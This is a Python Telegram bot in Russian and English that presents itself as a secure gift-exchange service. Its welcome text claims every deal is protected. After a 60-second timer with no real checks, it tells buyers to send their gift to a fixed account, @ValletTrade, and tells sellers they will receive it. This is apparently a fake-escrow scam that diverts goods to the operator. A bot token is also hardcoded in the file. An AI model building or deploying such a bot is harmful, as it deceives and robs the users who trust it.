import asyncio
import logging
import random
import re
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    ReplyKeyboardMarkup, KeyboardButton, 
    InlineKeyboardMarkup, InlineKeyboardButton,
    WebAppInfo, ReplyKeyboardRemove
)
from aiogram.utils.keyboard import InlineKeyboardBuilder

# ==================== КОНФИГУРАЦИЯ ====================
BOT_TOKEN = "8669209199:AAFnRG3FG4q0KpR7T-bk_THhpAhEltz_H7U"

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# ==================== ХРАНИЛИЩЕ ====================
exchanges = {}

# ==================== ФУНКЦИИ ====================
def generate_code():
    return f"{random.randint(0, 9999):04d}"

def format_price(price):
    if price.is_integer():
        return f"${int(price)}"
    return f"${price:.2f}"

# ==================== КРАСИВЫЕ КНОПКИ ====================
def get_main_keyboard():
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🆕 Создать сделку")],
            [KeyboardButton(text="🔗 Подключиться")],
            [KeyboardButton(text="📋 Мои сделки"), KeyboardButton(text="❌ Отмена")]
        ],
        resize_keyboard=True,
        input_field_placeholder="Выберите действие..."
    )
    return keyboard

def get_cancel_keyboard():
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="❌ Отмена")]
        ],
        resize_keyboard=True,
        input_field_placeholder="Для отмены нажмите кнопку"
    )
    return keyboard

# ==================== СОСТОЯНИЯ ====================
class TradeStates(StatesGroup):
    waiting_for_exchange = State()
    waiting_for_password = State()
    waiting_for_create_link = State()
    waiting_for_create_price = State()

# ==================== КОМАНДЫ ====================
@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    await state.clear()
    
    # Приветственное сообщение с эмодзи
    welcome_text = (
        "✨ *Добро пожаловать в Trade Bot!* ✨\n\n"
        "🤝 Здесь вы можете безопасно обмениваться подарками.\n\n"
        "📌 *Как это работает:*\n"
        "1️⃣ Нажмите «Создать сделку» и загрузите ссылку\n"
        "2️⃣ Получите уникальный номер и пароль\n"
        "3️⃣ Покупатель вводит данные и подключается\n"
        "4️⃣ Через 1 минуту сделка завершается ✅\n\n"
        "🔐 *Все сделки защищены!*\n\n"
        "✨ *Welcome to Trade Bot!* ✨\n"
        "🤝 Safe gift exchanges made easy."
    )
    
    await message.answer(
        welcome_text,
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )
    
    # Отправляем приветственный стикер (если есть)
    try:
        await message.answer_sticker("CAACAgIAAxkBAAEBK5RkXy6lAAGbU-Pvv7qMZiqHcm9kux0AAgQEAALwDCwI2aZLsMfHkHMeBA")
    except:
        pass

@dp.message(Command("cancel"))
async def cmd_cancel(message: types.Message, state: FSMContext):
    current_state = await state.get_state()
    if current_state is None:
        await message.answer(
            "❌ Нет активных операций для отмены.",
            reply_markup=get_main_keyboard()
        )
        return
    
    await state.clear()
    await message.answer(
        "✅ Операция отменена.\nМожете начать заново.",
        reply_markup=get_main_keyboard()
    )

@dp.message(Command("list"))
async def cmd_list(message: types.Message):
    if not exchanges:
        await message.answer(
            "📭 *Нет активных сделок*\n\nСоздайте первую сделку кнопкой ниже!",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
        return
    
    text = "📋 *Ваши активные сделки:*\n\n"
    for eid, data in exchanges.items():
        if data["status"] not in ["completed"]:
            status_emoji = "🟢" if data["status"] == "active" else "🟡"
            text += f"{status_emoji} #{eid} - {data['status']}\n"
    
    await message.answer(text, parse_mode="Markdown")

# ==================== КНОПКА СОЗДАТЬ СДЕЛКУ ====================
@dp.message(lambda message: message.text == "🆕 Создать сделку")
async def button_create_exchange(message: types.Message, state: FSMContext):
    exchange_id = generate_code()
    while exchange_id in exchanges:
        exchange_id = generate_code()
    
    password = generate_code()
    
    exchanges[exchange_id] = {
        "password": password,
        "creator": message.from_user.id,
        "gift_link": None,
        "price": None,
        "buyer": None,
        "status": "waiting_for_link"
    }
    
    await state.update_data(exchange_id=exchange_id)
    await state.set_state(TradeStates.waiting_for_create_link)
    
    await message.answer(
        f"🎉 *Сделка создана!*\n\n"
        f"📌 *Номер сделки:* `{exchange_id}`\n"
        f"🔑 *Пароль:* `{password}`\n\n"
        f"📎 Теперь отправьте *ссылку на подарок*:\n"
        f"_(например, ссылка на товар)_\n\n"
        f"💡 *Сохраните пароль!* Он понадобится покупателю.",
        parse_mode="Markdown",
        reply_markup=get_cancel_keyboard()
    )

@dp.message(TradeStates.waiting_for_create_link)
async def process_create_link(message: types.Message, state: FSMContext):
    gift_link = message.text.strip()
    
    if not re.match(r'^https?://', gift_link):
        await message.answer(
            "❌ Пожалуйста, отправьте *ссылку* (начинается с http:// или https://)",
            parse_mode="Markdown"
        )
        return
    
    data = await state.get_data()
    exchange_id = data.get('exchange_id')
    
    if exchange_id in exchanges:
        exchanges[exchange_id]["gift_link"] = gift_link
        exchanges[exchange_id]["status"] = "waiting_for_price"
    
    await state.set_state(TradeStates.waiting_for_create_price)
    
    await message.answer(
        f"✅ *Ссылка сохранена!*\n\n"
        f"💰 Теперь укажите *сумму* за подарок (в долларах):",
        parse_mode="Markdown",
        reply_markup=get_cancel_keyboard()
    )

@dp.message(TradeStates.waiting_for_create_price)
async def process_create_price(message: types.Message, state: FSMContext):
    try:
        price = float(message.text.replace(',', '.'))
        if price <= 0:
            await message.answer("❌ Сумма должна быть *больше 0*", parse_mode="Markdown")
            return
    except ValueError:
        await message.answer(
            "❌ Введите *число* (например: 100 или 150.50)",
            parse_mode="Markdown"
        )
        return
    
    data = await state.get_data()
    exchange_id = data.get('exchange_id')
    gift_link = data.get('gift_link')
    
    if exchange_id in exchanges:
        exchanges[exchange_id]["price"] = price
        exchanges[exchange_id]["status"] = "waiting_for_buyer"
    
    price_str = format_price(price)
    
    # Красивое финальное сообщение
    await message.answer(
        f"✅ *Сделка успешно создана!* 🎉\n\n"
        f"📋 *Номер:* `{exchange_id}`\n"
        f"🔑 *Пароль:* `{exchanges[exchange_id]['password']}`\n"
        f"🔗 *Ссылка:* {gift_link}\n"
        f"💰 *Сумма:* {price_str}\n\n"
        f"⏳ *Ожидайте подключения покупателя...*\n"
        f"Вы получите уведомление, когда кто-то подключится.",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )
    
    await state.clear()

# ==================== КНОПКА ПОДКЛЮЧИТЬСЯ ====================
@dp.message(lambda message: message.text == "🔗 Подключиться")
async def button_connect_exchange(message: types.Message, state: FSMContext):
    await state.set_state(TradeStates.waiting_for_exchange)
    await message.answer(
        "🔍 Введите *номер сделки*:\n\n"
        "_(который вы получили от продавца)_",
        parse_mode="Markdown",
        reply_markup=get_cancel_keyboard()
    )

@dp.message(TradeStates.waiting_for_exchange)
async def process_exchange_number(message: types.Message, state: FSMContext):
    exchange_id = message.text.strip()
    
    if exchange_id not in exchanges:
        await message.answer(
            f"❌ *Сделка #{exchange_id} не найдена!*\n"
            f"Проверьте номер и попробуйте снова.",
            parse_mode="Markdown"
        )
        return
    
    if exchanges[exchange_id]["status"] == "completed":
        await message.answer(
            f"❌ *Сделка #{exchange_id} уже завершена!*",
            parse_mode="Markdown"
        )
        await state.clear()
        return
    
    await state.update_data(exchange_id=exchange_id)
    await state.set_state(TradeStates.waiting_for_password)
    
    await message.answer(
        f"🔑 Введите *пароль* для сделки #{exchange_id}:",
        parse_mode="Markdown"
    )

@dp.message(TradeStates.waiting_for_password)
async def process_password(message: types.Message, state: FSMContext):
    password = message.text.strip()
    data = await state.get_data()
    exchange_id = data.get('exchange_id')
    
    if exchange_id not in exchanges:
        await message.answer("❌ Сделка не найдена.", reply_markup=get_main_keyboard())
        await state.clear()
        return
    
    if exchanges[exchange_id]["password"] != password:
        await message.answer(
            f"❌ *Неверный пароль!*\nПопробуйте снова.",
            parse_mode="Markdown"
        )
        return
    
    # ✅ Подключение
    exchanges[exchange_id]["buyer"] = message.from_user.id
    exchanges[exchange_id]["status"] = "active"
    
    price = exchanges[exchange_id]["price"]
    gift_link = exchanges[exchange_id]["gift_link"]
    price_str = format_price(price)
    
    # Уведомление покупателя
    await message.answer(
        f"✅ *Подключение успешно!* 🔗\n\n"
        f"📋 *Сделка #{exchange_id}*\n"
        f"🔗 *Ссылка:* {gift_link}\n"
        f"💰 *Сумма:* {price_str}\n\n"
        f"⏳ *Ожидайте 1 минуту...*\n"
        f"Продавец подтвердит сделку автоматически.",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )
    
    # Уведомление создателя
    creator_id = exchanges[exchange_id]["creator"]
    try:
        await bot.send_message(
            creator_id,
            f"🔔 *Кто-то подключился к сделке #{exchange_id}!*\n\n"
            f"💰 *Сумма:* {price_str}\n"
            f"⏳ Через 1 минуту сделка завершится.\n"
            f"📦 Подготовьте подарок!",
            parse_mode="Markdown"
        )
    except:
        pass
    
    await state.clear()
    
    # ⏳ Задержка 60 секунд
    await asyncio.sleep(60)
    
    if exchange_id not in exchanges or exchanges[exchange_id]["status"] != "active":
        return
    
    exchanges[exchange_id]["status"] = "completed"
    
    # Финальное сообщение для покупателя
    try:
        await message.answer(
            f"✅ *Сделка завершена!* 🎉\n\n"
            f"📦 Отправьте подарок продавцу:\n"
            f"@ValletTrade\n\n"
            f"📋 *Детали:*\n"
            f"└ Номер: #{exchange_id}\n"
            f"└ Сумма: {price_str}",
            parse_mode="Markdown"
        )
    except:
        pass
    
    # Уведомление создателя
    try:
        await bot.send_message(
            creator_id,
            f"✅ *Сделка #{exchange_id} завершена!* 🎉\n\n"
            f"📦 Получите подарок от покупателя!\n"
            f"💰 Сумма: {price_str}",
            parse_mode="Markdown"
        )
    except:
        pass

# ==================== КНОПКА МОИ СДЕЛКИ ====================
@dp.message(lambda message: message.text == "📋 Мои сделки")
async def button_my_exchanges(message: types.Message):
    user_id = message.from_user.id
    
    my_exchanges = []
    for eid, data in exchanges.items():
        if data["creator"] == user_id or data.get("buyer") == user_id:
            if data["status"] != "completed":
                my_exchanges.append((eid, data))
    
    if not my_exchanges:
        await message.answer(
            "📭 *У вас нет активных сделок*\n\n"
            "Создайте новую сделку кнопкой 🆕 Создать сделку",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
        return
    
    text = "📋 *Ваши сделки:*\n\n"
    for eid, data in my_exchanges:
        role = "👤 Создатель" if data["creator"] == user_id else "🛒 Покупатель"
        status_emoji = "🟢" if data["status"] == "active" else "🟡"
        text += f"{status_emoji} #{eid} - {role}\n"
    
    await message.answer(text, parse_mode="Markdown")

# ==================== КНОПКА ОТМЕНА ====================
@dp.message(lambda message: message.text == "❌ Отмена")
async def button_cancel(message: types.Message, state: FSMContext):
    current_state = await state.get_state()
    if current_state is None:
        await message.answer(
            "❌ Нет активных операций.",
            reply_markup=get_main_keyboard()
        )
        return
    
    await state.clear()
    await message.answer(
        "✅ Отменено!",
        reply_markup=get_main_keyboard()
    )

# ==================== ОСТАЛЬНЫЕ СООБЩЕНИЯ ====================
@dp.message()
async def handle_all_messages(message: types.Message, state: FSMContext):
    current_state = await state.get_state()
    
    if current_state is None:
        await message.answer(
            "❓ Я не понимаю эту команду.\n\n"
            "Используйте кнопки ниже для навигации 👇",
            reply_markup=get_main_keyboard()
        )
        return
    
    await message.answer(
        "⏳ Пожалуйста, следуйте инструкциям бота.\n"
        "Используйте кнопки для ответа.",
        reply_markup=get_main_keyboard()
    )

# ==================== ЗАПУСК ====================
async def main():
    print("=" * 50)
    print("✨ TRADE BOT ✨")
    print("📋 4-значный ID и пароль")
    print("⏳ 60 секунд на сделку")
    print("💰 Валюта: $")
    print("=" * 50)
    
    try:
        await dp.start_polling(bot)
    except KeyboardInterrupt:
        print("\n🛑 Бот остановлен")
    finally:
        await bot.session.close()

if __name__ == "__main__":
    asyncio.run(main())
